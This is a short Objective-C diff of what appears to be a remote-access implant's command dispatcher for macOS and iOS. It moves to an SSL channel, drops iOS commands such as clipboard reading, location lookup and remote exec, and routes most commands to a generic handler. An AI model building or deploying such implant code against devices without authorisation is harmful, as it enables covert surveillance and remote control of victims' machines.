@@ -24,9 +24,12 @@
 
 #import <Foundation/Foundation.h>
 
-#import "apple_ios/commands.h"
+#include <openssl/ssl.h>
 
-void handle_command(int channel, char *cmd, char *args)
+#import "generic.h"
+#import "macos/commands.h"
+
+void stdapi(SSL *channel, char *cmd, char *args)
 {
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
@@ -34,34 +37,8 @@ void handle_command(int channel, char *cmd, char *args)
     NSString *command = [NSString stringWithFormat:@"%s", cmd];
     NSString *argv = [NSString stringWithFormat:@"%s", args];
 
-    if ([command isEqualToString:@"sysinfo"])
-        [commands cmd_sysinfo];
-    else if ([command isEqualToString:@"getpid"])
+    if ([command isEqualToString:@"getpid"])
         [commands cmd_getpid];
-    else if ([command isEqualToString:@"getpaste"])
-        [commands cmd_getpaste];
-    else if ([command isEqualToString:@"battery"])
-        [commands cmd_battery];
-    else if ([command isEqualToString:@"getvol"])
-        [commands cmd_getvol];
-    else if ([command isEqualToString:@"locate"])
-        [commands cmd_locate];
-    else if ([command isEqualToString:@"vibrate"])
-        [commands cmd_vibrate];
-    else if ([command isEqualToString:@"bundleids"])
-        [commands cmd_bundleids];
-    else if ([command isEqualToString:@"exec"])
-        [commands cmd_exec:argv];
-    else if ([command isEqualToString:@"say"])
-        [commands cmd_say:argv];
-    else if ([command isEqualToString:@"setvol"])
-        [commands cmd_setvol:argv];
-    else if ([command isEqualToString:@"player"])
-        [commands cmd_player:argv];
-    else if ([command isEqualToString:@"openapp"])
-        [commands cmd_openapp:argv];
-    else if ([command isEqualToString:@"openurl"])
-        [commands cmd_openurl:argv];
-    else if ([command isEqualToString:@"chdir"])
-        [commands cmd_chdir:argv];
+    else
+        generic(channel, cmd, args);
 }
